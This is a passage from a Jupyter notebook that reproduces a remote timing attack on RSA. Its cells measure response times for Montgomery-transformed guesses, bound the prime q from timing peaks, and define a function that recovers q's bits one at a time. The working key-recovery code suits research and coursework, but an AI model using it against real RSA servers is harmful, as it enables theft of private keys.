xmlns=\"http://www.w3.org/1999/xhtml\"><div style=\"box-sizing: border-box; font-size: 0; text-align: center; \"><div style=\"display: inline-block; font-size: 12px; font-family: Helvetica; color: #57B041; line-height: 1.2; pointer-events: all; font-weight: bold; white-space: normal; word-wrap: normal; \"><div>2p</div></div></div></div></foreignObject><text fill=\"#57B041\" font-family=\"Helvetica\" font-size=\"12px\" font-weight=\"bold\" text-anchor=\"middle\" x=\"450\" y=\"374\">2p</text></switch></g><path d=\"M 50 310 L 202.93 157.07 Q 210 150 210 160 L 210 260 Q 210 270 218 264 L 362 156 Q 370 150 370 160 L 370 260 Q 370 270 378 264 L 530 150\" fill=\"none\" pointer-events=\"stroke\" stroke=\"#b5739d\" stroke-miterlimit=\"10\" stroke-width=\"2\"/><path d=\"M 50 310 L 242.19 156.25 Q 250 150 250 160 L 250 260 Q 250 270 258.57 264.86 L 441.43 155.14 Q 450 150 450 160 L 450 260 Q 450 270 458.48 264.7 L 530 220\" fill=\"none\" pointer-events=\"stroke\" stroke=\"#57b041\" stroke-miterlimit=\"10\" stroke-width=\"2\"/><path d=\"M 50 310 L 205.17 28.76 Q 210 20 210 30 L 210 130 Q 210 140 215.55 131.68 L 244.45 88.32 Q 250 80 250 90 L 250 190 Q 250 200 256 192 L 364 48 Q 370 40 370 50 L 370 150 Q 370 160 375.88 151.91 L 444.12 58.09 Q 450 50 450 60 L 450 160 Q 450 170 455.88 161.91 L 530 60\" fill=\"none\" pointer-events=\"stroke\" stroke=\"#4f42ff\" stroke-miterlimit=\"10\" stroke-width=\"2\"/><rect fill=\"none\" height=\"20\" pointer-events=\"all\" stroke=\"none\" width=\"190\" x=\"536\" y=\"50\"/><g transform=\"translate(-0.5 -0.5)\"><switch><foreignObject height=\"100%\" pointer-events=\"none\" requiredFeatures=\"http://www.w3.org/TR/SVG11/feature#Extensibility\" style=\"overflow: visible; text-align: left;\" width=\"100%\"><div style=\"display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 188px; height: 1px; padding-top: 60px; margin-left: 538px;\" xmlns=\"http://www.w3.org/1999/xhtml\"><div style=\"box-sizing: border-box; font-size: 0; text-align: left; \"><div style=\"display: inline-block; font-size: 12px; font-family: Helvetica; color: #4F42FF; line-height: 1.2; pointer-events: all; font-weight: bold; white-space: normal; word-wrap: normal; \"><div align=\"left\">num reductions g mod pq</div></div></div></div></foreignObject><text fill=\"#4F42FF\" font-family=\"Helvetica\" font-size=\"12px\" font-weight=\"bold\" x=\"538\" y=\"64\">num reductions g mod pq</text></switch></g><rect fill=\"none\" height=\"20\" pointer-events=\"all\" stroke=\"none\" width=\"190\" x=\"536\" y=\"140\"/><g transform=\"translate(-0.5 -0.5)\"><switch><foreignObject height=\"100%\" pointer-events=\"none\" requiredFeatures=\"http://www.w3.org/TR/SVG11/feature#Extensibility\" style=\"overflow: visible; text-align: left;\" width=\"100%\"><div style=\"display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 188px; height: 1px; padding-top: 150px; margin-left: 538px;\" xmlns=\"http://www.w3.org/1999/xhtml\"><div style=\"box-sizing: border-box; font-size: 0; text-align: left; \"><div style=\"display: inline-block; font-size: 12px; font-family: Helvetica; color: #4F42FF; line-height: 1.2; pointer-events: all; font-weight: bold; white-space: normal; word-wrap: normal; \"><div align=\"left\"><font color=\"#B5739D\">num reductions g mod q<br/></font></div></div></div></div></foreignObject><text fill=\"#4F42FF\" font-family=\"Helvetica\" font-size=\"12px\" font-weight=\"bold\" x=\"538\" y=\"154\">num reductions g mod q\n",
       "</text></switch></g><rect fill=\"none\" height=\"20\" pointer-events=\"all\" stroke=\"none\" width=\"190\" x=\"536\" y=\"210\"/><g transform=\"translate(-0.5 -0.5)\"><switch><foreignObject height=\"100%\" pointer-events=\"none\" requiredFeatures=\"http://www.w3.org/TR/SVG11/feature#Extensibility\" style=\"overflow: visible; text-align: left;\" width=\"100%\"><div style=\"display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 188px; height: 1px; padding-top: 220px; margin-left: 538px;\" xmlns=\"http://www.w3.org/1999/xhtml\"><div style=\"box-sizing: border-box; font-size: 0; text-align: left; \"><div style=\"display: inline-block; font-size: 12px; font-family: Helvetica; color: #4F42FF; line-height: 1.2; pointer-events: all; font-weight: bold; white-space: normal; word-wrap: normal; \"><div align=\"left\"><font color=\"#57B041\">num reductions g mod p<br/></font></div></div></div></div></foreignObject><text fill=\"#4F42FF\" font-family=\"Helvetica\" font-size=\"12px\" font-weight=\"bold\" x=\"538\" y=\"224\">num reductions g mod p\n",
       "</text></switch></g></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "execution_count": 82,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "display.SVG(filename=\"./res/remote-timing-fig-1-sketch.svg\")  # edit res/remote-timing-fig-1-sketch.xml on draw.io"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "I believe that "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### (b) By increasing the neighborhood size we increase the zero-one gap between a bit of q that is 0 and a bit of q that is 1."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-55-f5e2bd8f5b58>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     14\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     15\u001b[0m     \u001b[0mq_0_samples\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m[\u001b[0m\u001b[0msympy\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mInteger\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtime\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mfor\u001b[0m \u001b[0mpoint\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtime\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mattack\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msample\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mq_0\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m50\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 16\u001b[0;31m     \u001b[0mq_1_samples\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m[\u001b[0m\u001b[0msympy\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mInteger\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtime\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mfor\u001b[0m \u001b[0mpoint\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtime\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mattack\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msample\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mq_1\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m50\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     17\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     18\u001b[0m     \u001b[0mq_0_average\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfloat\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0msum\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mq_0_samples\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m/\u001b[0m\u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mq_0_samples\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/project/attack.py\u001b[0m in \u001b[0;36msample\u001b[0;34m(points, num_samples)\u001b[0m\n\u001b[1;32m     69\u001b[0m     \u001b[0;32mfor\u001b[0m \u001b[0mpoint\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mpoints\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     70\u001b[0m         \u001b[0;32mfor\u001b[0m \u001b[0miteration\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mrange\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mnum_samples\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 71\u001b[0;31m             \u001b[0mgc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mcollect\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     72\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     73\u001b[0m             \u001b[0msock\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0msocket\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msocket\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0msocket\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mAF_INET\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0msocket\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mSOCK_STREAM\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "q_bits = attack.sympy_integer_to_bits(q)\n",
    "\n",
    "zeros = []\n",
    "ones = []\n",
    "\n",
    "for index, bit in enumerate(q_bits[0:100]):\n",
    "    q_0_bits = q_bits.copy()\n",
    "    q_0_bits[index] = 0\n",
    "    q_0 = attack.bits_to_sympy_integer(q_0_bits)\n",
    "    \n",
    "    q_1_bits = q_bits.copy()\n",
    "    q_1_bits[index] = 1\n",
    "    q_1 = attack.bits_to_sympy_integer(q_1_bits)\n",
    "    \n",
    "    q_0_samples = [sympy.Integer(time) for point, time in attack.sample([q_0], 50)]\n",
    "    q_1_samples = [sympy.Integer(time) for point, time in attack.sample([q_1], 50)]\n",
    "    \n",
    "    q_0_average = float(sum(q_0_samples)/len(q_0_samples))\n",
    "    q_1_average = float(sum(q_1_samples)/len(q_1_samples))\n",
    "    \n",
    "    zeros.append(q_0_average)\n",
    "    ones.append(q_1_average)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "zero_one_gaps = [abs(zero - one) for zero, one in zip(zeros, ones)]\n",
    "zero_one_gaps = pandas.DataFrame({\n",
    "    'bit': list(range(len(zero_one_gaps))),\n",
    "    'gap': zero_one_gaps,\n",
    "})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "seaborn.relplot(\n",
    "    kind='scatter',\n",
    "    x='bit',\n",
    "    y='gap',\n",
    "    data=zero_one_gaps,\n",
    "    height=8,\n",
    "    aspect=16/8,\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\" \".join([str(bit) for bit in q_bits[0:100]]))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Figure 3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Bounding our search for `q`\n",
    "\n",
    "`q` should be strictly less than the second peak we observe."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(time                   825016.41300\n",
       " point_relative_to_p         0.85998\n",
       " point_relative_to_q         0.88568\n",
       " Name: 10055855947456947824680518748654384595609524365444295033292671082791323022555160232601405723625177570767523893639864538140315412108959927459825236754563072, dtype: float64,\n",
       " time                   781572.64300\n",
       " point_relative_to_p         1.14664\n",
       " point_relative_to_q         1.18090\n",
       " Name: 13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903427690031858186486050853753882811946569946433649006084096, dtype: float64)"
      ]
     },
     "execution_count": 58,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "peak_indices, _ = scipy.signal.find_peaks(mean['time'])\n",
    "\n",
    "first_peak_index = peak_indices[0]\n",
    "first_peak = mean.iloc[first_peak_index]\n",
    "\n",
    "second_peak_index = peak_indices[1]\n",
    "second_peak = mean.iloc[second_peak_index]\n",
    "\n",
    "first_peak, second_peak"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The initial estimate we start with (from the paper) bounds `q` such that:\n",
    "\n",
    "$$2^{log_2(N/2)-1} = 2^{511} < q < 2^{log_2(N/2)} = 2^{512}$$\n",
    "\n",
    "And calculate these values explicitly:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/latex": [
       "$\\displaystyle 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503042048$"
      ],
      "text/plain": [
       "6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503042048"
      ]
     },
     "execution_count": 89,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sympy.sympify(\"2**511\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/latex": [
       "$\\displaystyle 13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903427690031858186486050853753882811946569946433649006084096$"
      ],
      "text/plain": [
       "13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903427690031858186486050853753882811946569946433649006084096"
      ]
     },
     "execution_count": 90,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sympy.sympify(\"2**512\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Using our first two peaks to bound $q$, we get a tighter bound: \n",
    "$6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503042048 < 10055855947456947824680518748654384595609524365444295033292671082791323022555160232601405723625177570767523893639864538140315412108959927459825236754563072 < q < 11693128827090800677443535237632476895247105886644942164014088484470194179491435241190389270827811769965853291192455791684691555403909415703633832493911789 < 13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903427690031858186486050853753882811946569946433649006084096$"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "These bounds will fix some of `q`'s binary bits. Lets figure those out by writing them out in binary:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1 1\n",
      "1 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n",
      "0 1\n",
      "0 0\n",
      "0 1\n"
     ]
    }
   ],
   "source": [
    "lower_bound_bits = attack.sympy_integer_to_bits(sympy.Integer(\"10055855947456947824680518748654384595609524365444295033292671082791323022555160232601405723625177570767523893639864538140315412108959927459825236754563072\"))\n",
    "upper_bound_bits = attack.sympy_integer_to_bits(sympy.Integer(\"11693128827090800677443535237632476895247105886644942164014088484470194179491435241190389270827811769965853291192455791684691555403909415703633832493911789\"))\n",
    "\n",
    "for lower_bit, upper_bit in zip(lower_bound_bits, upper_bound_bits):\n",
    "    print(\"{} {}\".format(lower_bit, upper_bit))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(512, 512)"
      ]
     },
     "execution_count": 60,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(lower_bound_bits), len(upper_bound_bits)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So we know the most significant 3 bits of $q$ are:\n",
    "  - $q_{511} = 1$\n",
    "  - $q_{510} = 1$\n",
    "  - $q_{509} = 0$"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "512"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "q_bits = [1, 1, 0] + [0]*509\n",
    "len(q_bits)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "q_bits[2]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We happen to know $q$ is prime, and therefore odd, meaning the least significant bit is 1. We'll ignore that for now."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# The meat of it"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "metadata": {},
   "outputs": [],
   "source": [
    "def reverse_montegomery_transform(g, N):\n",
    "    R = sympy.Integer(2) ** 512\n",
    "    R_inverse = sympy.numbers.mod_inverse(R, N)\n",
    "    u_g = (g * R_inverse) % N\n",
    "    return u_g\n",
    "\n",
    "def learn_ith_bit_of_q(q_bits, i, N, sample_size=7, neighbourhood_size=400):\n",
    "    num_bits = len(q_bits)\n",
    "    \n",
    "    g_low_bits = q_bits[0:i] + [0] + [0]*(num_bits - (i+1))\n",
    "    g_low = attack.bits_to_sympy_integer(g_low_bits)\n",
    "    g_low_neighbours = [g_low + k for k in range(neighbourhood_size)]\n",
    "    u_g_low_neighbours = [reverse_montegomery_transform(neighbour, N) for neighbour in g_low_neighbours]\n",
    "        \n",
    "    g_high_bits = q_bits[0:i] + [1] + [0]*(num_bits - (i+1))\n",
    "    g_high = attack.bits_to_sympy_integer(g_high_bits)\n",
    "    g_high_neighbours = [g_high + k for k in range(neighbourhood_size)]\n",
    "    u_g_high_neighbours = [reverse_montegomery_transform(neighbour, N) for neighbour in g_high_neighbours]\n",
    "    \n",
    "    g_low_samples = attack.sample(u_g_low_neighbours, sample_size)\n",
    "    g_low_samples = pandas.DataFrame.from_records(\n",
    "        g_low_samples,\n",
    "        columns=[\"point\", \"time\"],\n",
    "    )\n",
    "    T_g_low = g_low_samples.groupby(by=\"point\").median()['time'].sum()\n",
    "    \n",
    "    g_high_samples = attack.sample(u_g_high_neighbours, sample_size)\n",
    "    g_high_samples = pandas.DataFrame.from_records(\n",
    "        g_high_samples,\n",
    "        columns=[\"point\", \"time\"],\n",
    "    )\n",
    "    T_g_high = g_high_samples.groupby(by=\"point\").median()['time'].sum()\n",
    "    \n",
    "    return T_g_low, T_g_high"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "correct_q_bits = attack.sympy_integer_to_bits(q)\n",
    "\n",
    "gaps = []\n",
    "for i in range(0, 8):\n",
    "    T_g_low, T_g_high = learn_ith_bit_of_q(correct_q_bits, i, N, neighbourhood_size=100)\n",
    "    gap = abs(T_g_low-T_g_high)\n",
    "    gaps.append(gap)\n",
    "    \n",
    "    print(i, correct_q_bits[i], T_g_low, T_g_high, gap)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "First, we need to know what gaps to consider \"large\" and what gaps to consider \"small\". Since we know the first 3 bits of $q$, take measurements of their zero-one gaps and use those as reference points."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [],
   "source": [
    "zero_gaps = []\n",
    "one_gaps = []"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [],
   "source": [
    "T_g_low, T_g_high = learn_ith_bit_of_q(q_bits, 1, N, neighbourhood_size=400)\n",
    "one_gaps.append(abs(T_g_low-T_g_high))"
   ]
  },
  {
   "cell_type": "code",
